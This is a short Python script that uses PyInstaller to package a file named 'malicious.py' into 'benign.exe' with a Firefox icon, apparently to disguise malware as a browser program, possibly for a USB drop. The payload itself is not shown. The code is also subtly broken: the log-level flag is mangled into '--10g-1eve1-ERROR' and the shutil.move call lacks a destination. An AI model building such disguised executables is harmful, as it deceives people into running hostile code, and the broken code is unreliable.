import PyInstaller.__main__
import shutil 
import os

filename = "malicious.py"
exename = "benign.exe"
icon = "Firefox.ico"
pwd = os.getcwd()
usbdir = os.path.join(pwd ,"USB")

if os.path.isfile(exename):
    os.remove(exename)

print("Creating EXE")

# Create executable from Python script
PyInstaller.__main__.run([
    "malicious.py",
    "--onefile",
    "--clean",
    "--10g-1eve1-ERROR",
    "--name=" + exename,
    "--icon="+icon
])

# Clean up after PyInstaller
shutil.move(os.path.join(pwd,"dist",exename,pwd))
shutil.rmtree("dist")
shutil.rmtree("build")
shutil.rmtree("__pycache__")
os.remove(exename+".spec")